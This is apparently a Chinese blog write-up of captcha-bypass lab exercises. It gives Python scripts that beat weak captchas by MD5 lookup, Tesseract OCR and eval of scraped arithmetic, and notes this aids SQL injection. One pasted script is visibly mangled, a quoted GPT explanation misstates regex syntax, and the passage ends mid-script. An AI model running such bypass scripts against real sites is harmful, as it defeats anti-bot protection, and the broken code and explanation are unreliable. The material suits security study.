<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这个例子是弱点的最后一个例子，这里的弱点来自用于创建验证码的字典；<br>仅使用有限数量的单词。您可以通过生成所有单词和图像的 MD5 的列表来轻松编写破解程序。然后，当您想要提交表单时，您只需检索图像，计算其 MD5 并提交匹配的单词即可。<br></code></pre></td></tr></table></figure>
<p>这意思是我们可以把这些验证码都保存下来，然后每次用验证码与保存下来的做对比。就可以搞定。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">0dayz<br>nacher<br>compromise<br>pentester<br>security<br>vulnerablity<br>admin<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231216224438643.png'><img src="image-20231216224438643.png" alt="image-20231216224438643"></p>
<p>不过我还是不能理解这种漏洞的利用之处，毕竟是需要爆破的，但这似乎也是有一定利用点的，只不过我们每次需要尝试的次数变多了吧</p>
<p>在附上一个师傅写的脚本，这里我看不太懂。。。懒得读了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">captcha5</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.60.114/captcha/example5/&quot;</span><br>    post_url = <span class="hljs-string">&quot;http://192.168.60.114/captcha/example5/submit?captcha=&#123;&#125;&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;</span><br>    <span class="hljs-comment"># base_url = &quot;http://10.108.40.237/&quot;</span><br>    ss = requests.session()<br>    captcha = &#123;&#125;<br>    <span class="hljs-comment"># get pic md5</span><br>    dirs,folder,files = os.walk(<span class="hljs-string">&quot;./pic/&quot;</span>).<span class="hljs-built_in">next</span>()<br>    <span class="hljs-keyword">for</span> fi <span class="hljs-keyword">in</span> files:<br>        <span class="hljs-keyword">if</span> fi.endswith(<span class="hljs-string">&quot;png&quot;</span>):<br>            path = os.path.join(dirs, fi)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                md5 = hashlib.md5(f.read()).hexdigest()<br>                <span class="hljs-built_in">print</span> fi, fi[<span class="hljs-number">0</span>: -<span class="hljs-number">4</span>]<br>                captcha[md5] = fi[<span class="hljs-number">0</span>: -<span class="hljs-number">4</span>]<br>    <span class="hljs-comment"># get pic</span><br>    html = ss.get(url)<br>    <span class="hljs-comment"># print html.text</span><br>    <span class="hljs-comment"># print html.content</span><br>    soup = BeautifulSoup(html.text, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>    src = soup.select(<span class="hljs-string">&quot;img&quot;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;src&quot;</span>]<br>    <span class="hljs-built_in">print</span> src<br>    img_data = ss.get(url + src).content<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] img_url: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(url + src)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pic.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(img_data)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pic.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        img_md5 = hashlib.md5(f.read()).hexdigest()<br>    <span class="hljs-keyword">if</span> img_md5 <span class="hljs-keyword">in</span> captcha:<br>        html = ss.get(post_url.<span class="hljs-built_in">format</span>(captcha[img_md5]))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;img_content: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(captcha[img_md5])<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;post_url: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(post_url.<span class="hljs-built_in">format</span>(captcha[img_md5]))<br>        <span class="hljs-comment"># print html.text</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> html.text:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] Successful..&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Somethine Wrong&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="Example-6-3"><a href="#Example-6-3" class="headerlink" title="Example-6-3"></a>Example 6</h2>
<p>感觉这题就上难度了，看官方说明我都整不明白，他是这样说的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">在这个例子中，我们将使用 OCR 工具（Tesseract）来破解这个简单的验证码。这里的目标是构建一个获得高成功率的脚本。<br><br>只需使用 tesseract 的基本脚本，您的成功率就可以达到 95% 以上。您将需要使用以下算法：<br><br>	1.转到主页 http://vulnerable/captcha/example6/ 获取新的验证码和 cookie ( rack.session )。<br>	2.检索图像，<br>	3.在图像上运行 tesseract 并检索结果。<br>	4.使用正确的 cookie 提交结果。<br>以下几点可以提高你的成功率：<br>	1.仅当它是单词时才提交值。<br>	2.仅当值仅包含小写字符时才提交该值。<br><br>根据应用程序工作流程，您可能希望获得非常高的成功率。例如，如果您花费 10 分钟填写表格，您希望确保验证码破解程序具有较高的成功率。如果只是为了利用 SQL 注入，您可以重试，直到找到正确的值，并且不需要非常准确。<br></code></pre></td></tr></table></figure>
<p>仔细思考似乎懂了他表达的意思，首先我们看一下这关</p>
<p class='item-img' data-src='image-20231217160121205.png'><img src="image-20231217160121205.png" alt="image-20231217160121205"></p>
<p>如上图，可以看到这关给出的验证码是非常清晰的，也就是易识别。倘若此时该网站存在某些漏洞比如SQL注入，但我们在注入的时候每次都需要手工输入正确的验证码，这无疑增加了我们的阻力。但我们可以通过写自动化脚本来完成。此时由于该网站的验证码易抓取，那我们完全可以每次注入的时候爬取页面的验证码，这便大大减少了我们注入的阻力。</p>
<p>这里尝试了半天发现看不懂脚本，也不会修改脚本，看他们都Python版本都对不上。。。这里就先附上吧</p>
<p>脚本一：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> pytesseract<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.0.104/captcha/example6/&quot;</span><br>    rs = requests.session()<br>    r = rs.get(url)<br>    html = r.text<br>    img_url = re.findall(<span class="hljs-string">&#x27;img src=&quot;(.*?)&quot;/ &gt;&#x27;</span>,html)[<span class="hljs-number">0</span>]<br>    img_content = rs.get(url+img_url).content<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(img_content)<br><br>    image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.png&quot;</span>)<br>    text = pytesseract.image_to_string(image)  <span class="hljs-comment"># 使用简体中文解析图片</span><br>    check_url = <span class="hljs-string">&quot;http://192.168.0.104/captcha/example6/submit?captcha=&quot;</span>+text+<span class="hljs-string">&quot;img src=&quot;</span>(.*?)<span class="hljs-string">&quot;/ &gt;&#x27;, html)[0]</span><br><span class="hljs-string">    img_content = rs.get(url + img_url).content</span><br><span class="hljs-string">    with open(&quot;</span>test.png<span class="hljs-string">&quot;, &quot;</span>w<span class="hljs-string">b&quot;) as f:</span><br><span class="hljs-string">        f.write(img_content)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    im = Image.open(&#x27;test.png&#x27;)</span><br><span class="hljs-string">    im = im.convert(&#x27;RGBA&#x27;)</span><br><span class="hljs-string">    pixdata = im.load()</span><br><span class="hljs-string">    for y in range(im.size[1]):</span><br><span class="hljs-string">        for x in range(im.size[0]):</span><br><span class="hljs-string">            if pixdata[x, y][0] == 65 :</span><br><span class="hljs-string">                pixdata[x, y] = (255, 255, 255, 255)</span><br><span class="hljs-string">    #im.show()</span><br><span class="hljs-string">    im.save(&#x27;test1.png&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">    image = Image.open(&quot;</span>test1.png<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    text = pytesseract.image_to_string(image)  # 使用简体中文解析图片</span><br><span class="hljs-string">    print(text)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # check_url = &quot;</span>http://<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.104</span>/captcha/example7/submit?captcha=<span class="hljs-string">&quot;+text+&quot;</span>!--注释掉查询的结尾。<br></code></pre></td></tr></table></figure>
<p>脚本二：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">captcha67</span>():<br>    url = <span class="hljs-string">&quot;http://10.108.40.237/captcha/example8/&quot;</span><br>    login_url = <span class="hljs-string">&quot;http://10.108.40.237/captcha/example8/submit?captcha=&#123;&#125;&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2&quot;</span><br>    ss = requests.session()<br>    html = ss.get(url).text<br>    soup = BeautifulSoup(html, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>    pic_src = soup.select(<span class="hljs-string">&quot;img&quot;</span>)[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;src&quot;</span>]<br>    img_data = ss.get(url + pic_src).content<br>    img_name = <span class="hljs-string">&quot;captcha6.png&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(img_name, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(img_data)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">img_2_str</span>(<span class="hljs-params">filename</span>):<br>        cmd = <span class="hljs-string">&quot;tesseract &#123;&#125; &#123;&#125;&quot;</span><br>        <span class="hljs-built_in">print</span> cmd.<span class="hljs-built_in">format</span>(filename, filename)<br>        strs = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            output = subprocess.check_output(cmd.<span class="hljs-built_in">format</span>(filename, filename), shell=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename+<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                strs = f.read().strip()<br>            <span class="hljs-keyword">return</span> strs<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[-] Error Happend!&quot;</span><br>            <span class="hljs-keyword">return</span> strs<br>    result = img_2_str(img_name)<br>    <span class="hljs-keyword">if</span> result != <span class="hljs-string">&quot;&quot;</span>:<br>        html = ss.get(login_url.<span class="hljs-built_in">format</span>(result)).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> html:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[+] OK!&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="Example-7-2"><a href="#Example-7-2" class="headerlink" title="Example-7-2"></a>Example 7</h2>
<p class='item-img' data-src='image-20231217163619380.png'><img src="image-20231217163619380.png" alt="image-20231217163619380"></p>
<p>可以看到这关的验证码依然很清晰，不过有着蓝色部分的阻碍，这使得我们需要修改脚本，下列是官方说明：</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ruby">如果我们使用与上述相同的技术，我们可以看到成功率明显较低。为了提高识别度，我们将尝试删除蓝色的“<span class="hljs-title class_">HatchFill</span>”。<br><br>一个非常简单的方法是在运行 tesseract 之前使用阈值来修改图像。这可以通过以下代码来完成：<br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;RMagick&#x27;</span><br>image = <span class="hljs-title class_">Magick</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Image</span>.read(<span class="hljs-string">&quot;current7.png&quot;</span>).first<br>image = image.threshold(<span class="hljs-variable constant_">THRESHOLD</span>)<br>image.write(<span class="hljs-string">&quot;current7.png&quot;</span>)<br><br>您可以使用 <span class="hljs-variable constant_">THRESHOLD</span> 值来提高检测率。只需使用这个简单的技巧，成功率就会提高。而且，由于 tesseract 检测到的信息符合条件（只有一个由小写字符组成的单词），因此获得此速率所需的时间较短。<br></code></pre></td></tr></table></figure>
<p>不过这里那些师傅也没写出来脚本。。。附上GPT对上述部分代码的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这段代码使用了 Ruby 的 RMagick 库，这是一个用于处理图像的库，可以进行各种图像操作，包括读取、修改和写入图像等。以下是对代码的详细解释：<br><br>1. `require &#x27;RMagick&#x27;`: 这行代码引入了 RMagick 库，使得代码可以使用该库提供的图像处理功能。在引入之后，你就可以使用 RMagick 中的类和方法了。<br><br>2. `image = Magick::Image.read(&quot;current7.png&quot;).first`: 这行代码通过 `Magick::Image.read` 方法从文件 &quot;current7.png&quot; 中读取图像。`Magick::Image.read` 返回一个图像对象的数组，因为一个图像文件可能包含多个图像（比如 GIF 文件中的多帧动画），所以使用 `.first` 选择了数组中的第一个图像对象，并将其赋值给变量 `image`。<br><br>3. `image = image.threshold(THRESHOLD)`: 这行代码调用了 `threshold` 方法，该方法用于对图像进行二值化处理，将图像中的像素值转换为二值（黑白）图像。`THRESHOLD` 是一个阈值，用于决定哪些像素被认为是黑色，哪些是白色。这个阈值可能在代码的其他地方被定义，但在提供的代码中并没有给出具体的值。<br><br>4. `image.write(&quot;current7.png&quot;)`: 最后一行代码将处理后的图像写回到文件 &quot;current7.png&quot;。这样，原始图像经过二值化处理后的结果就被保存到同一文件中，覆盖了原始图像。<br><br>需要注意的是，由于阈值 `THRESHOLD` 没有在提供的代码中定义，你需要确保在实际使用时为其提供一个具体的数值。不同的阈值会导致不同的二值化效果，因此选择适当的阈值对于获得期望的结果非常重要。<br></code></pre></td></tr></table></figure>
<p>看来重点就是threshold部分的处理了</p>
<h2 id="Example-8-2"><a href="#Example-8-2" class="headerlink" title="Example-8-2"></a>Example 8</h2>
<p class='item-img' data-src='image-20231217164215820.png'><img src="image-20231217164215820.png" alt="image-20231217164215820"></p>
<p>这里可以看到又是不清晰的验证码了，我们看一下官方说明</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ruby">在这里我们可以看到图像被内爆了。我们将打开图像，取消内爆并使用之前的技术来提高成功率。<br><br>可以使用以下代码：<br><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;RMagick&#x27;</span><br>image = <span class="hljs-title class_">Magick</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:Image</span>.read(<span class="hljs-string">&quot;current8.png&quot;</span>).first<br>image = image.implode(<span class="hljs-variable constant_">IMPLODE</span>)<br>image = image.threshold(<span class="hljs-variable constant_">THRESHOLD</span>)<br>image.write(<span class="hljs-string">&quot;current8.png&quot;</span>)<br><br>您可以使用 <span class="hljs-variable constant_">THRESHOLD</span> 和 <span class="hljs-variable constant_">IMPLODE</span> （ <span class="hljs-variable constant_">IMPLODE</span> 可以为负）值来提高检测率。<br>与前面的示例一样，检测率将会提高，并且获得该检测率所需的时间将会减少。<br></code></pre></td></tr></table></figure>
<p>附上GPT对上述代码的解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这段代码与之前的代码类似，同样使用了 RMagick 库来处理图像。下面是对这段代码的详细解释：<br><br>1. `require &#x27;RMagick&#x27;`: 引入了 RMagick 库。<br><br>2. `image = Magick::Image.read(&quot;current8.png&quot;).first`: 通过 `Magick::Image.read` 方法读取名为 &quot;current8.png&quot; 的图像文件。与之前的代码一样，选择数组中的第一个图像对象，并将其赋值给变量 `image`。<br><br>3. `image = image.implode(IMPLODE)`: 调用了 `implode` 方法，该方法用于实现图像的爆炸效果。`IMPLODE` 是一个参数，用于控制爆炸的程度。和之前的代码一样，该参数并没有在提供的代码中给出具体的值，所以在实际使用时需要提供一个适当的值。<br><br>4. `image = image.threshold(THRESHOLD)`: 接下来调用了 `threshold` 方法，对图像进行二值化处理。同样，`THRESHOLD` 是一个阈值，决定了哪些像素被认为是黑色，哪些是白色。该阈值需要在实际使用时提供。<br><br>5. `image.write(&quot;current8.png&quot;)`: 最后一行代码将处理后的图像写回到文件 &quot;current8.png&quot; 中，覆盖原始图像。<br><br>注意，`IMPLODE` 和 `THRESHOLD` 这两个参数在提供的代码中并没有具体的值，因此在实际使用时需要根据需要定义它们。不同的参数值会产生不同的效果，所以选择适当的值是很关键的。<br></code></pre></td></tr></table></figure>
<p>这个爆炸效果是什么意思呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">爆炸效果通常是一种图像处理效果，用于创建一种视觉上的爆炸或扩散效果，使图像中的元素向外扩散或碎裂。这种效果常常用于艺术创作、图形设计、游戏开发等领域，以增加图像的动感和视觉吸引力。<br><br>具体来说，在 RMagick 库中，`implode` 方法被用于实现这种爆炸效果。这个方法接受一个参数 `IMPLODE`，用于控制爆炸的程度。当 `IMPLODE` 的值为正时，图像的元素会向内收缩，而当值为负时，图像的元素会向外扩散，产生一种爆炸的效果。<br><br>这种效果可以用来创建一些艺术性的图像，或者在设计中为特定元素的突出显示增加一些动态感。在游戏开发中，爆炸效果也经常用于模拟爆炸、碎裂或其他视觉上的破坏效果，提高游戏的视觉吸引力。<br><br>总的来说，爆炸效果是一种图像处理手段，通过改变图像元素的位置或形状，创造出一种动感和生动的视觉效果。<br></code></pre></td></tr></table></figure>
<p>奥~~也就是说我们通过设置<code>IMPLODE</code>爆炸程度，可以达到恢复验证码为正常大小。</p>
<h2 id="Example-9-2"><a href="#Example-9-2" class="headerlink" title="Example-9-2"></a>Example 9</h2>
<p class='item-img' data-src='image-20231217164457825.png'><img src="image-20231217164457825.png" alt="image-20231217164457825"></p>
<p>这关是一个算数验证码题，很明显我们编写脚本会很容易，只需要抓取页面算数的部分，调用某些数学库来计算即可。我们看一下官方解释：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">该验证码依赖于要求客户端执行简单的算术运算，破解起来非常简单。您可以仅 eval 提供的字符串（可能不是一个好主意），或者您可以编写一个简单的解析器来为您执行算术运算。这种保护可以防止真正愚蠢的机器人，但对于任何会编写一些脚本的人来说，很容易绕过。<br></code></pre></td></tr></table></figure>
<p>附上脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">captcha9</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.246.135/captcha/example9/&quot;</span><br>    post_url = <span class="hljs-string">&quot;http://192.168.246.135/captcha/example9/submit?captcha=&#123;&#125;&amp;submit=Submit&quot;</span><br>    ss = requests.session() <span class="hljs-comment">#创建了一个会话对象，用于在多个请求之间保持 cookie。</span><br>    html = ss.get(url).text <span class="hljs-comment">#发送 GET 请求获取网页的 HTML 内容，并将结果保存在变量 html 中。</span><br>    soup = BeautifulSoup(html, <span class="hljs-string">&quot;html.parser&quot;</span>) <span class="hljs-comment">#使用 BeautifulSoup 解析 HTML。 	</span><br>    form = soup.select(<span class="hljs-string">&quot;form&quot;</span>)[<span class="hljs-number">0</span>].text <span class="hljs-comment">#从解析后的 HTML 中选择第一个 &lt;form&gt; 元素，并获取其文本内容。</span><br>    <span class="hljs-built_in">print</span>((form.strip()))  <span class="hljs-comment">#打印表达式字符串，其中 strip() 用于去除字符串两端的空格和换行符。</span><br>    <span class="hljs-comment">#使用正则表达式匹配表达式字符串，提取出形如 &quot;数字 运算符 数字&quot; 的部分，并将结果保存在变量 </span><br>    captcha = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&quot;(\d+[+\-*/]\d+)\s*=&quot;</span>, form.strip()) <br>    <span class="hljs-keyword">if</span> captcha:<br>        <span class="hljs-comment">#这一部分通过 re.match 的结果对象 captcha 获取匹配的第一个子组（由括号包围的部分）。</span><br>        result =  <span class="hljs-built_in">eval</span>(captcha.group(<span class="hljs-number">1</span>))  <span class="hljs-comment">#使用 eval 函数计算表达式的结果，匹配的是括号中的部分。</span><br>        html = ss.get(post_url.<span class="hljs-built_in">format</span>(result)).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Success&quot;</span> <span class="hljs-keyword">in</span> html:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] OK&quot;</span>)<br><br>captcha9()<br></code></pre></td></tr></table></figure>
<p>这个脚本挺简单的，学习一波，顺便问一下GPT上述正则的解释</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">让我们详细解释一下你提供的正则表达式：<br><br>```python<br>re.match(r&quot;(\d+[+\-*/]\d+)\s*=&quot;, form.strip())<br>```<br><br>1. **`re.match`**: 这是正则表达式模块 `re` 中的 `match` 函数，用于尝试从字符串的开头匹配一个模式。它返回一个匹配对象或 `None`，表示匹配成功或失败。<br><br>2. **`r&quot;`: 这是一个原始字符串（raw string）的前缀。在正则表达式中，使用原始字符串可以避免反斜杠 `\` 的转义作用，使得正则表达式更清晰。<br><br>3. **`(\d+[+\-*/]\d+)`**: 这是一个捕获组，括号内的部分表示一个子表达式，可以通过 `group(1)` 获取。具体解释如下：<br><br>   - **`\d+`**: 匹配一个或多个数字。<br>   - **`[+\-*/]`**: 匹配一个加号、减号、乘号或除号。由于减号 `-` 在正则表达式中有特殊含义（表示一个或多个前面的元素），所以需要使用反斜杠 `\` 进行转义，以保持其原意。这样 `[+\-*/]` 表示匹配任意一个加号、减号、乘号或除号。<br>   - **`\d+`**: 再次匹配一个或多个数字。<br>   - **`(\d+[+\-*/]\d+)`**: 整体表示匹配一个数学表达式。<br><br>4. **`\s*`**: 匹配零个或多个空白字符（包括空格、制表符、换行符等）。<br><br>5. **`=`**: 匹配等号字符。<br><br>6. **`form.strip()`**: 对输入字符串 `form` 进行操作，`strip()` 方法用于去除字符串两端的空白字符（空格、制表符、换行符等），以确保不会因为字符串两端的空格而影响匹配。<br><br>整体来说，这个正则表达式的目的是匹配形如 &quot;数字 运算符 数字&quot; 的数学表达式，等号前后可能有空白字符。<br></code></pre></td></tr></table></figure>
<p>在此基础上改良一下，使得他可以重复发送http请求</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">captcha9</span>():<br>    url = <span class="hljs-string">&quot;http://192.168.246.135/captcha/example9/&quot;</span><br>    post_url = <span class="hljs-string">&quot;http://192.168.246.135/captcha/example9/submit?captcha=&#123;&#125;&amp;submit=Submit&quot;</span><br>    ss = requests.session()<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 持续发送请求获取网页内容</span><br>        html = ss.get(url).text<br>        soup = BeautifulSoup(html, 